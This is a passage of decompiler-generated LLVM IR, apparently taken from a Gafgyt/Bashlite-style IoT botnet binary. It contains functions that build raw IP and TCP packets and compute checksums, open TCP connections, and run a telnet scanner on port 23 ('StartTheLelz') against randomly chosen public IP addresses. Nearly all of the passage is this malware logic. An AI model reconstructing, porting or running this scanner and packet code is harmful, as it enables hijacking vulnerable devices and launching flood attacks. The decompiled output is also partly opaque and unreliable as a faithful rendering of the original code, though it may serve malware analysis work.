  uselistorder i32 %v4_804a004, { 1, 0 }
  uselistorder label %dec_label_pc_804a034, { 1, 0 }
  uselistorder label %dec_label_pc_8049ff7, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a07d = load i32, i32* @ebp, align 4
  store i32 %v0_804a07d, i32* %stack_var_-4, align 4
  %v4_804a07d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a07d, i32* @ebp, align 4
  %v1_804a091 = add i32 %tmp10, 12
  %v2_804a091 = inttoptr i32 %v1_804a091 to i32*
  %v3_804a091 = load i32, i32* %v2_804a091, align 4
  %v1_804a09a = add i32 %tmp10, 16
  %v2_804a09a = inttoptr i32 %v1_804a09a to i32*
  %v3_804a09a = load i32, i32* %v2_804a09a, align 4
  %v2_804a0af = call i32 @htons(i16 20)
  %v1_804a0c8 = call i32 @malloc(i32 32)
  store i32 %v1_804a0c8, i32* %ecx.global-to-local, align 4
  %v2_804a0d8 = inttoptr i32 %v1_804a0c8 to i32*
  store i32 %v3_804a091, i32* %v2_804a0d8, align 4
  %v1_804a0dd = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a0dd = add i32 %v1_804a0dd, 4
  %v3_804a0dd = inttoptr i32 %v2_804a0dd to i32*
  store i32 %v3_804a09a, i32* %v3_804a0dd, align 4
  %v1_804a0e3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a0e3 = add i32 %v1_804a0e3, 8
  %v3_804a0e3 = inttoptr i32 %v2_804a0e3 to i32*
  store i32 0, i32* %v3_804a0e3, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804a0ec = add i32 %v1_804a0c8, 12
  store i32 %v1_804a0ec, i32* %edx.global-to-local, align 4
  %v1_804a0ef = inttoptr i32 %tmp2 to i32*
  %v2_804a0ef = load i32, i32* %v1_804a0ef, align 4
  %v2_804a0f1 = inttoptr i32 %v1_804a0ec to i32*
  store i32 %v2_804a0ef, i32* %v2_804a0f1, align 4
  %v0_804a0f3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0f3 = add i32 %v0_804a0f3, 4
  %v2_804a0f3 = inttoptr i32 %v1_804a0f3 to i32*
  %v3_804a0f3 = load i32, i32* %v2_804a0f3, align 4
  %v1_804a0f6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0f6 = add i32 %v1_804a0f6, 4
  %v3_804a0f6 = inttoptr i32 %v2_804a0f6 to i32*
  store i32 %v3_804a0f3, i32* %v3_804a0f6, align 4
  %v0_804a0f9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0f9 = add i32 %v0_804a0f9, 8
  %v2_804a0f9 = inttoptr i32 %v1_804a0f9 to i32*
  %v3_804a0f9 = load i32, i32* %v2_804a0f9, align 4
  %v1_804a0fc = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0fc = add i32 %v1_804a0fc, 8
  %v3_804a0fc = inttoptr i32 %v2_804a0fc to i32*
  store i32 %v3_804a0f9, i32* %v3_804a0fc, align 4
  %v0_804a0ff = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0ff = add i32 %v0_804a0ff, 12
  %v2_804a0ff = inttoptr i32 %v1_804a0ff to i32*
  %v3_804a0ff = load i32, i32* %v2_804a0ff, align 4
  %v1_804a102 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a102 = add i32 %v1_804a102, 12
  %v3_804a102 = inttoptr i32 %v2_804a102 to i32*
  store i32 %v3_804a0ff, i32* %v3_804a102, align 4
  %v0_804a105 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a105 = add i32 %v0_804a105, 16
  %v2_804a105 = inttoptr i32 %v1_804a105 to i32*
  %v3_804a105 = load i32, i32* %v2_804a105, align 4
  %v1_804a108 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a108 = add i32 %v1_804a108, 16
  %v3_804a108 = inttoptr i32 %v2_804a108 to i32*
  store i32 %v3_804a105, i32* %v3_804a108, align 4
  %v2_804a118 = inttoptr i32 %v1_804a0c8 to i16*
  %v3_804a118 = call i32 @csum(i16* %v2_804a118, i32 32)
  %v1_804a11d = urem i32 %v3_804a118, 65536
  %v1_804a12a = call i32 @free(i32 %v1_804a0c8)
  %v2_804a133 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a133, i32* @ebp, align 4
  ret i32 %v1_804a11d

; uselistorder directives
  uselistorder i32 %v1_804a0c8, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a135 = load i32, i32* @ebp, align 4
  store i32 %v0_804a135, i32* %stack_var_-4, align 4
  %v4_804a13b = sext i8 %tmp8 to i32
  %v4_804a141 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804a15c = add i32 %v4_804a141, 1
  %v2_804a15c = inttoptr i32 %v1_804a15c to i8*
  store i8 0, i8* %v2_804a15c, align 1
  %v1_804a166 = add i32 %tmp5, 20
  %v1_804a16f = trunc i32 %v1_804a166 to i16
  %v3_804a16f = add i32 %v4_804a141, 2
  %v4_804a16f = inttoptr i32 %v3_804a16f to i16*
  store i16 %v1_804a16f, i16* %v4_804a16f, align 2
  %v2_804a173 = call i32 @rand_cmwc(i32 %v4_804a13b)
  %v1_804a17e = trunc i32 %v2_804a173 to i16
  %v3_804a17e = add i32 %v4_804a141, 4
  %v4_804a17e = inttoptr i32 %v3_804a17e to i16*
  store i16 %v1_804a17e, i16* %v4_804a17e, align 2
  %v1_804a185 = add i32 %v4_804a141, 6
  %v2_804a185 = inttoptr i32 %v1_804a185 to i16*
  store i16 0, i16* %v2_804a185, align 2
  %v1_804a18e = add i32 %v4_804a141, 8
  %v2_804a18e = inttoptr i32 %v1_804a18e to i8*
  store i8 -1, i8* %v2_804a18e, align 1
  %v3_804a199 = add i32 %v4_804a141, 9
  %v4_804a199 = inttoptr i32 %v3_804a199 to i8*
  store i8 %tmp8, i8* %v4_804a199, align 1
  %v1_804a19f = add i32 %v4_804a141, 10
  %v2_804a19f = inttoptr i32 %v1_804a19f to i16*
  store i16 0, i16* %v2_804a19f, align 2
  %v2_804a1ab = add i32 %v4_804a141, 12
  %v3_804a1ab = inttoptr i32 %v2_804a1ab to i32*
  %v2_804a1b4 = add i32 %v4_804a141, 16
  %v3_804a1b4 = inttoptr i32 %v2_804a1b4 to i32*
  store i32 %tmp, i32* %v3_804a1b4, align 4
  %v2_804a1b7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a1b7, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 4, 0, 1, 3, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804a1bf = add i32 %arg1, -2
  %v9_804a1bf = sub i32 1, %arg1
  %v10_804a1bf = and i32 %v9_804a1bf, %arg1
  %v11_804a1bf = icmp slt i32 %v10_804a1bf, 0
  %v12_804a1bf = icmp eq i32 %v4_804a1bf, 0
  %v13_804a1bf = icmp slt i32 %v4_804a1bf, 0
  %v3_804a1c3 = icmp eq i1 %v13_804a1bf, %v11_804a1bf
  %v4_804a1c3 = icmp eq i1 %v12_804a1bf, false
  %v5_804a1c3 = and i1 %v4_804a1c3, %v3_804a1c3
  br i1 %v5_804a1c3, label %dec_label_pc_804a1ce, label %dec_label_pc_804a1e0

dec_label_pc_804a1ce:                             ; preds = %entry
  %v1_804a1d4 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804a1e0

dec_label_pc_804a1e0:                             ; preds = %entry, %dec_label_pc_804a1ce
  %storemerge = phi i32 [ 0, %dec_label_pc_804a1ce ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804a1bf, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a1e0, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804a1e5 = load i32, i32* @ebp, align 4
  store i32 %v0_804a1e5, i32* %stack_var_-4, align 4
  %v4_804a1e5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a1e5, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804a1ff = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804a207 = icmp eq i32 %v1_804a1ff, 0
  %v1_804a20b = icmp eq i1 %v4_804a207, false
  br i1 %v1_804a20b, label %dec_label_pc_804a219, label %dec_label_pc_804a2de

dec_label_pc_804a219:                             ; preds = %entry
  %v1_804a21c = add i32 %v1_804a1ff, 12
  %v2_804a21c = inttoptr i32 %v1_804a21c to i32*
  %v3_804a21c = load i32, i32* %v2_804a21c, align 4
  %v1_804a224 = add i32 %v1_804a1ff, 16
  %v2_804a224 = inttoptr i32 %v1_804a224 to i32*
  %v3_804a224 = load i32, i32* %v2_804a224, align 4
  %v1_804a227 = inttoptr i32 %v3_804a224 to i32*
  %v2_804a227 = load i32, i32* %v1_804a227, align 4
  %v15_804a230 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804a23a = call i32 @bcopy(i32 %v2_804a227, i32 %v15_804a230, i32 %v3_804a21c)
  %v2_804a246 = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804a26f = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804a277 = ptrtoint i32* %stack_var_-32 to i32
  %v5_804a29c = call i32 @__GI_setsockopt(i32 %v3_804a26f, i32 6, i32 1, i32 %v2_804a277, i32 4)
  %v13_804a2a1 = icmp eq i32 %v3_804a26f, -1
  %v1_804a2a5 = icmp eq i1 %v13_804a2a1, false
  br i1 %v1_804a2a5, label %dec_label_pc_804a2b0, label %dec_label_pc_804a2de

dec_label_pc_804a2b0:                             ; preds = %dec_label_pc_804a219
  %v2_804a22d = ptrtoint i32* %stack_var_-28 to i32
  %v3_804a2c5 = call i32 @__libc_connect(i32 %v3_804a26f, i32 %v2_804a22d, i32 16)
  %v10_804a2ca = icmp eq i32 %v3_804a2c5, -1
  %v1_804a2cd = icmp eq i1 %v10_804a2ca, false
  br i1 %v1_804a2cd, label %dec_label_pc_804a2d8, label %dec_label_pc_804a2de

dec_label_pc_804a2d8:                             ; preds = %dec_label_pc_804a2b0
  br label %dec_label_pc_804a2de

dec_label_pc_804a2de:                             ; preds = %dec_label_pc_804a2b0, %dec_label_pc_804a219, %entry, %dec_label_pc_804a2d8
  %stack_var_-44.0 = phi i32 [ %v3_804a26f, %dec_label_pc_804a2d8 ], [ 0, %entry ], [ 0, %dec_label_pc_804a219 ], [ 0, %dec_label_pc_804a2b0 ]
  %v2_804a2e1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a2e1, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804a26f, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804a2de, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804a2fc = call i32 @__GI_time(i32* null)
  store i32 %v2_804a2fc, i32* %eax.global-to-local, align 4
  store i32 %v2_804a2fc, i32* @ebx, align 4
  %v1_804a303 = call i32 @rand_cmwc(i32 0)
  %v1_804a308 = load i32, i32* @ebx, align 4
  %v2_804a308 = xor i32 %v1_804a308, %v1_804a303
  store i32 %v2_804a308, i32* @eax, align 4
  %v1_804a30d = call i32 @srand(i32 %v2_804a308)
  store i32 %v1_804a30d, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v2_804a322 = call i32 @htons(i16 23)
  %v2_804a331 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804a337 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804a337, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804a34e = call i32 @malloc(i32 1025)
  store i32 %v1_804a34e, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804a36f = inttoptr i32 %v1_804a34e to i8*
  %v4_804a36f = call i32 @__GI_memset(i8* %v3_804a36f, i32 0, i32 1025)
  %v2_804a385 = mul i32 %arg2, 28
  %v1_804a38a = add i32 %v2_804a385, 30
  %v2_804a38d = and i32 %v1_804a38a, -16
  %v0_804a393 = load i32, i32* @esp, align 4
  %v2_804a393 = sub i32 %v0_804a393, %v2_804a38d
  %v1_804a3a5 = add i32 %v2_804a393, 35
  %v2_804a3a8 = and i32 %v1_804a3a5, -16
  %v2_804a3c5 = mul i32 %arg2, 5
  store i32 %v2_804a3c5, i32* %edx.global-to-local, align 4
  %v1_804a3cb = inttoptr i32 %v2_804a3a8 to i8*
  store i32 %v2_804a3a8, i32* @edi, align 4
  %v1_804a3d0 = and i32 %v1_804a3a5, -256
  store i32 %v1_804a3d0, i32* %eax.global-to-local, align 4
  %v5_804a3d2 = call i8* @_memset(i8* %v1_804a3cb, i32 %v1_804a3d0, i32 %v2_804a3c5)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a45f58 = icmp sgt i32 %arg2, 0
  br i1 %v5_804a45f58, label %dec_label_pc_804a3dd.lr.ph, label %dec_label_pc_804a46c

dec_label_pc_804a3dd.lr.ph:                       ; preds = %entry
  %v2_804a431 = or i32 %v2_804a3a8, 9
  br label %dec_label_pc_804a3dd

dec_label_pc_804a3dd:                             ; preds = %dec_label_pc_804a3dd, %dec_label_pc_804a3dd.lr.ph
  %storemerge259 = phi i32 [ 0, %dec_label_pc_804a3dd.lr.ph ], [ %v4_804a456, %dec_label_pc_804a3dd ]
  %v2_804a3f1 = mul i32 %storemerge259, 28
  %v2_804a3f3 = add i32 %v2_804a3f1, %v2_804a3a8
  store i32 %v2_804a3f3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a3fb = inttoptr i32 %v2_804a3f3 to i32*
  store i32 0, i32* %v2_804a3fb, align 4
  %v0_804a3fd = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3fd = add i32 %v0_804a3fd, 4
  store i32 %v1_804a3fd, i32* %eax.global-to-local, align 4
  %v0_804a400 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a400 = inttoptr i32 %v1_804a3fd to i32*
  store i32 %v0_804a400, i32* %v2_804a400, align 4
  %v0_804a402 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a402 = add i32 %v0_804a402, 4
  store i32 %v1_804a402, i32* %eax.global-to-local, align 4
  %v0_804a405 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a405 = inttoptr i32 %v1_804a402 to i32*
  store i32 %v0_804a405, i32* %v2_804a405, align 4
  %v0_804a407 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a407 = add i32 %v0_804a407, 4
  store i32 %v1_804a407, i32* %eax.global-to-local, align 4
  %v0_804a40a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a40a = inttoptr i32 %v1_804a407 to i32*
  store i32 %v0_804a40a, i32* %v2_804a40a, align 4
  %v0_804a40c = load i32, i32* %eax.global-to-local, align 4
  %v1_804a40c = add i32 %v0_804a40c, 4
  store i32 %v1_804a40c, i32* %eax.global-to-local, align 4
  %v0_804a40f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a40f = inttoptr i32 %v1_804a40c to i32*
  store i32 %v0_804a40f, i32* %v2_804a40f, align 4
  %v0_804a411 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a411 = add i32 %v0_804a411, 4
  store i32 %v1_804a411, i32* %eax.global-to-local, align 4
  %v0_804a414 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a414 = inttoptr i32 %v1_804a411 to i32*
  store i32 %v0_804a414, i32* %v2_804a414, align 4
  %v0_804a416 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a416 = add i32 %v0_804a416, 4
  %v0_804a419 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a419 = inttoptr i32 %v1_804a416 to i32*
  store i32 %v0_804a419, i32* %v2_804a419, align 4
  %v3_804a431 = add i32 %v2_804a431, %v2_804a3f1
  %v4_804a431 = inttoptr i32 %v3_804a431 to i8*
  store i8 1, i8* %v4_804a431, align 1
  %v1_804a44e = add i32 %v2_804a3f3, 24
  store i32 %v1_804a44e, i32* %edx.global-to-local, align 4
  %v2_804a454 = inttoptr i32 %v1_804a44e to i32*
  store i32 %v1_804a34e, i32* %v2_804a454, align 4
  %v4_804a456 = add nuw nsw i32 %storemerge259, 1
  store i32 %v4_804a456, i32* %eax.global-to-local, align 4
  %exitcond60 = icmp eq i32 %v4_804a456, %arg2
  br i1 %exitcond60, label %dec_label_pc_804a46c, label %dec_label_pc_804a3dd

dec_label_pc_804a46c:                             ; preds = %entry, %dec_label_pc_804a3dd, %dec_label_pc_804a46c
  %stack_var_-48.0 = phi i32 [ %v4_804a46c, %dec_label_pc_804a46c ], [ 0, %dec_label_pc_804a3dd ], [ 0, %entry ]
  %v4_804a46c = add i32 %stack_var_-48.0, 1
  store i32 %v4_804a46c, i32* %eax.global-to-local, align 4
  %v1_804a472 = mul i32 %v4_804a46c, 4
  %v2_804a472 = add i32 %v1_804a472, ptrtoint ([10 x i8*]* @global_var_8058160.51 to i32)
  %v3_804a472 = inttoptr i32 %v2_804a472 to i32*
  %v4_804a472 = load i32, i32* %v3_804a472, align 4
  store i32 %v4_804a472, i32* %eax.global-to-local, align 4
  %v1_804a479 = icmp eq i32 %v4_804a472, 0
  %v1_804a47b = icmp eq i1 %v1_804a479, false
  br i1 %v1_804a47b, label %dec_label_pc_804a46c, label %dec_label_pc_804a47d.preheader

dec_label_pc_804a47d.preheader:                   ; preds = %dec_label_pc_804a46c
  %v2_804a8cd = ptrtoint i32* %stack_var_-316 to i32
  %tmp37 = bitcast i32* %stack_var_-316 to i8*
  %v2_804a94d = ptrtoint i32* %stack_var_-324 to i32
  %v2_804a9b3 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804a9bd = ptrtoint i32* %stack_var_-332 to i32
  %v2_804a4ed = or i32 %v2_804a3a8, 8
  %v2_804a52d = or i32 %v2_804a3a8, 9
  %v2_804a61e = or i32 %v2_804a3a8, 11
  %v2_804a665 = or i32 %v2_804a3a8, 10
  %v2_804b0d6 = add i32 %v2_804a3a8, 16
  br label %dec_label_pc_804a47d

dec_label_pc_804a47d:                             ; preds = %dec_label_pc_804a47d, %dec_label_pc_804b459, %dec_label_pc_804a47d.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804a47d.preheader ], [ %stack_var_-624.0, %dec_label_pc_804a47d ], [ %stack_var_-624.1, %dec_label_pc_804b459 ]
  %stack_var_-628.0 = phi i32 [ %tmp3, %dec_label_pc_804a47d.preheader ], [ %stack_var_-628.0, %dec_label_pc_804a47d ], [ %stack_var_-628.1, %dec_label_pc_804b459 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a45f58, label %dec_label_pc_804a489, label %dec_label_pc_804a47d

dec_label_pc_804a489:                             ; preds = %dec_label_pc_804a47d, %dec_label_pc_804b459
  %storemerge49 = phi i32 [ %v4_804b459, %dec_label_pc_804b459 ], [ 0, %dec_label_pc_804a47d ]
  %stack_var_-628.248 = phi i32 [ %stack_var_-628.1, %dec_label_pc_804b459 ], [ %stack_var_-628.0, %dec_label_pc_804a47d ]
  %stack_var_-624.247 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804b459 ], [ %stack_var_-624.0, %dec_label_pc_804a47d ]
  %v1_804a48f = mul i32 %storemerge49, 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  %v2_804a49d = mul i32 %storemerge49, 28
  %v2_804a49f = add i32 %v2_804a49d, %v2_804a3a8
  %v1_804a4a1 = add i32 %v2_804a49f, 16
  store i32 %v1_804a4a1, i32* %eax.global-to-local, align 4
  %v1_804a4a4 = inttoptr i32 %v1_804a4a1 to i32*
  %v2_804a4a4 = load i32, i32* %v1_804a4a4, align 4
  store i32 %v2_804a4a4, i32* %eax.global-to-local, align 4
  %v1_804a4a6 = icmp eq i32 %v2_804a4a4, 0
  %v1_804a4a8 = icmp eq i1 %v1_804a4a6, false
  br i1 %v1_804a4a8, label %dec_label_pc_804a4d7, label %dec_label_pc_804a4aa

dec_label_pc_804a4aa:                             ; preds = %dec_label_pc_804a489
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804a4ad = load i32, i32* @esp, align 4
  %v1_804a4ad = inttoptr i32 %v0_804a4ad to i32*
  store i32 0, i32* %v1_804a4ad, align 4
  %v1_804a4b4 = inttoptr i32 %storemerge49 to i32*
  %v2_804a4b4 = call i32 @__GI_time(i32* %v1_804a4b4)
  store i32 %v2_804a4b4, i32* @esi, align 4
  %v0_804a4be = load i32, i32* @ebx, align 4
  %v1_804a4c0 = mul i32 %v0_804a4be, 4
  store i32 %v1_804a4c0, i32* %edx.global-to-local, align 4
  %v2_804a4ce = mul i32 %v0_804a4be, 28
  %v2_804a4d0 = add i32 %v2_804a4ce, %v2_804a3a8
  %v1_804a4d2 = add i32 %v2_804a4d0, 16
  store i32 %v1_804a4d2, i32* %eax.global-to-local, align 4
  %v2_804a4d5 = inttoptr i32 %v1_804a4d2 to i32*
  store i32 %v2_804a4b4, i32* %v2_804a4d5, align 4
  br label %dec_label_pc_804a4d7

dec_label_pc_804a4d7:                             ; preds = %dec_label_pc_804a489, %dec_label_pc_804a4aa
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804a4ed = add i32 %v2_804a4ed, %v2_804a49d
  %v4_804a4ed = inttoptr i32 %v3_804a4ed to i8*
  %v5_804a4ed = load i8, i8* %v4_804a4ed, align 4
  %v6_804a4ed = zext i8 %v5_804a4ed to i32
  store i32 %v6_804a4ed, i32* %eax.global-to-local, align 4
  store i32 %v6_804a4ed, i32* @edi, align 4
  %v1_804a50e = mul nuw nsw i32 %v6_804a4ed, 4
  %v2_804a50e = add nuw nsw i32 %v1_804a50e, 134569348
  %v3_804a50e = inttoptr i32 %v2_804a50e to i32*
  %v4_804a50e = load i32, i32* %v3_804a50e, align 4
  store i32 %v4_804a50e, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a4ed, label %dec_label_pc_804b459 [
    i8 0, label %dec_label_pc_804a517
    i8 1, label %dec_label_pc_804a8c3
    i8 2, label %dec_label_pc_804ab29
    i8 3, label %dec_label_pc_804ac69
    i8 4, label %dec_label_pc_804adbc
    i8 5, label %dec_label_pc_804aefc
    i8 6, label %dec_label_pc_804b04f
    i8 7, label %dec_label_pc_804b2e9
  ]

dec_label_pc_804a517:                             ; preds = %dec_label_pc_804a4d7
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804a52d = add i32 %v2_804a52d, %v2_804a49d
  %v4_804a52d = inttoptr i32 %v3_804a52d to i8*
  %v5_804a52d = load i8, i8* %v4_804a52d, align 1
  %v10_804a532 = icmp eq i8 %v5_804a52d, 1
  %v1_804a534 = icmp eq i1 %v10_804a532, false
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  br i1 %v1_804a534, label %dec_label_pc_804a5e3, label %dec_label_pc_804a53a

dec_label_pc_804a53a:                             ; preds = %dec_label_pc_804a517
  %v1_804a552 = add i32 %v2_804a49f, 24
  store i32 %v1_804a552, i32* %eax.global-to-local, align 4
  %v1_804a555 = inttoptr i32 %v1_804a552 to i32*
  %v2_804a555 = load i32, i32* %v1_804a555, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a578 = inttoptr i32 %v2_804a49f to i32*
  store i32 0, i32* %v2_804a578, align 4
  %v0_804a57a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a57a = add i32 %v0_804a57a, 4
  store i32 %v1_804a57a, i32* %eax.global-to-local, align 4
  %v0_804a57d = load i32, i32* %edx.global-to-local, align 4
  %v2_804a57d = inttoptr i32 %v1_804a57a to i32*
  store i32 %v0_804a57d, i32* %v2_804a57d, align 4
  %v0_804a57f = load i32, i32* %eax.global-to-local, align 4
  %v1_804a57f = add i32 %v0_804a57f, 4
  store i32 %v1_804a57f, i32* %eax.global-to-local, align 4
  %v0_804a582 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a582 = inttoptr i32 %v1_804a57f to i32*
  store i32 %v0_804a582, i32* %v2_804a582, align 4
  %v0_804a584 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a584 = add i32 %v0_804a584, 4
  store i32 %v1_804a584, i32* %eax.global-to-local, align 4
  %v0_804a587 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a587 = inttoptr i32 %v1_804a584 to i32*
  store i32 %v0_804a587, i32* %v2_804a587, align 4
  %v0_804a589 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a589 = add i32 %v0_804a589, 4
  store i32 %v1_804a589, i32* %eax.global-to-local, align 4
  %v0_804a58c = load i32, i32* %edx.global-to-local, align 4
  %v2_804a58c = inttoptr i32 %v1_804a589 to i32*
  store i32 %v0_804a58c, i32* %v2_804a58c, align 4
  %v0_804a58e = load i32, i32* %eax.global-to-local, align 4
  %v1_804a58e = add i32 %v0_804a58e, 4
  store i32 %v1_804a58e, i32* %eax.global-to-local, align 4
  %v0_804a591 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a591 = inttoptr i32 %v1_804a58e to i32*
  store i32 %v0_804a591, i32* %v2_804a591, align 4
  %v0_804a593 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a593 = add i32 %v0_804a593, 4
  %v0_804a596 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a596 = inttoptr i32 %v1_804a593 to i32*
  store i32 %v0_804a596, i32* %v2_804a596, align 4
  store i32 %v1_804a552, i32* %edx.global-to-local, align 4
  store i32 %v2_804a555, i32* @eax, align 4
  store i32 %v2_804a555, i32* %v1_804a555, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v1_804a5bb = call i32 @GetRandomPublicIP(i32 %v6_804a4ed)
  %v0_804a5c5 = load i32, i32* @ebx, align 4
  %v1_804a5c7 = mul i32 %v0_804a5c5, 4
  store i32 %v1_804a5c7, i32* %edx.global-to-local, align 4
  %v2_804a5d5 = mul i32 %v0_804a5c5, 28
  %v2_804a5d7 = add i32 %v2_804a5d5, %v2_804a3a8
  %v1_804a5d9 = add i32 %v2_804a5d7, 4
  store i32 %v1_804a5d9, i32* %eax.global-to-local, align 4
  %v2_804a5dc = inttoptr i32 %v1_804a5d9 to i32*
  store i32 %v1_804a5bb, i32* %v2_804a5dc, align 4
  br label %dec_label_pc_804a712

dec_label_pc_804a5e3:                             ; preds = %dec_label_pc_804a517
  %v5_804a5f9 = load i8, i8* %v4_804a52d, align 1
  %v6_804a5f9 = zext i8 %v5_804a5f9 to i32
  store i32 %v6_804a5f9, i32* %eax.global-to-local, align 4
  %v4_804a5fe = icmp eq i8 %v5_804a5f9, 0
  %v1_804a600 = icmp eq i1 %v4_804a5fe, false
  br i1 %v1_804a600, label %dec_label_pc_804a712, label %dec_label_pc_804a606

dec_label_pc_804a606:                             ; preds = %dec_label_pc_804a5e3
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804a61e = add i32 %v2_804a61e, %v2_804a49d
  %v4_804a61e = inttoptr i32 %v3_804a61e to i8*
  %v5_804a61e = load i8, i8* %v4_804a61e, align 1
  %v2_804a625 = add i8 %v5_804a61e, 1
  store i8 %v2_804a625, i8* %v4_804a61e, align 1
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804a665 = add i32 %v2_804a665, %v2_804a49d
  %v4_804a665 = inttoptr i32 %v3_804a665 to i8*
  %v5_804a665 = load i8, i8* %v4_804a665, align 2
  %v2_804a66c = add i8 %v5_804a665, 1
  store i8 %v2_804a66c, i8* %v4_804a665, align 2
